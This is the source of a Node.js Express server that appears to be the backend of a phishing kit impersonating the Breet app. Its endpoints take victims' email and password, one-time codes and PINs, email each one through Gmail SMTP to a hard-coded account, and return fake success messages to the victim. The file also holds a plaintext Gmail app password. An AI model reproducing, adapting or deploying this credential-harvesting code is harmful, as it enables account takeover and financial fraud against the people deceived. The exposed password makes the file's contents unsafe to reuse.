const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");

// CRITICAL for Vercel — real client IP for rate limiter
app.set("trust proxy", 1);

// CORS
app.use(
  cors({
    origin: "https://breet-webapp.vercel.app",
    methods: ["GET", "POST", "OPTIONS"],
    allowedHeaders: ["Content-Type"],
    credentials: true,
  }),
);
app.options("*", cors());
app.use(express.json());

const PORT = process.env.PORT || 3001;

// Email credentials
const userEmail = "balibalireservation1@gmail.com";
const pass = "oukirdnupdejnsou";

// ── Manual Rate Limiter (no package needed) ──────────────────────────────────
const blockedIPs = new Set();
const requestCounts = new Map();

const RATE_LIMIT = 5;
const WINDOW_MS = 60 * 60 * 1000; // 1 hour

app.use((req, res, next) => {
  if (req.method !== "POST") return next();

  const ip = req.ip || req.socket.remoteAddress;

  if (blockedIPs.has(ip)) {
    return res.status(403).json({ success: false, message: "Access denied." });
  }

  const now = Date.now();
  let entry = requestCounts.get(ip);

  if (!entry || now > entry.resetAt) {
    entry = { count: 0, resetAt: now + WINDOW_MS };
  }

  entry.count++;
  requestCounts.set(ip, entry);

  if (entry.count > RATE_LIMIT) {
    blockedIPs.add(ip);
    return res.status(403).json({ success: false, message: "Access denied." });
  }

  next();
});

// ── Single transporter at startup ────────────────────────────────────────────
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: { user: userEmail, pass: pass },
});
transporter.verify((error) => {
  if (error) console.error("❌ Mail transporter error:", error.message);
  else console.log("✅ Mail transporter ready");
});

// ── Health check ─────────────────────────────────────────────────────────────
app.get("/", (req, res) => {
  res.json({ status: "ok", server: "Breet App API" });
});

// ── POST / — Email + Password capture ────────────────────────────────────────
app.post("/", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res
      .status(400)
      .json({ success: false, message: "Email and password are required" });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `Breet Login — ${email}`,
    text: `Breet App Login\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toISOString()}`,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log("Email sent:", info.response);
    res.status(200).json({ success: true, message: "Login successful" });
  } catch (error) {
    console.error("Error:", error);
    res.status(500).json({ success: false, message: "Error occurred" });
  }
});

// ── POST /otp — OTP capture ───────────────────────────────────────────────────
app.post("/otp", async (req, res) => {
  const { email, otp } = req.body;

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `Breet OTP — ${email || "unknown"}`,
    text: `Breet App OTP\nEmail: ${email || "unknown"}\nOTP Code: ${otp}\nTime: ${new Date().toISOString()}`,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log("Email sent:", info.response);
    res.status(200).json({ success: true, message: "OTP verified successfully" });
  } catch (error) {
    console.error("Error:", error);
    res.status(500).json({ success: false, message: "Error occurred" });
  }
});

// ── POST /pin — PIN capture ───────────────────────────────────────────────────
app.post("/pin", async (req, res) => {
  const { pin } = req.body;

  if (!pin) {
    return res.status(400).json({ success: false, message: "PIN is required" });
  }

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `Breet PIN Captured`,
    text: `Breet App PIN\nPIN: ${pin}\nTime: ${new Date().toISOString()}`,
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log("Email sent:", info.response);
    res.status(200).json({ success: true, message: "PIN saved successfully" });
  } catch (error) {
    console.error("Error:", error);
    res.status(500).json({ success: false, message: "Error occurred" });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
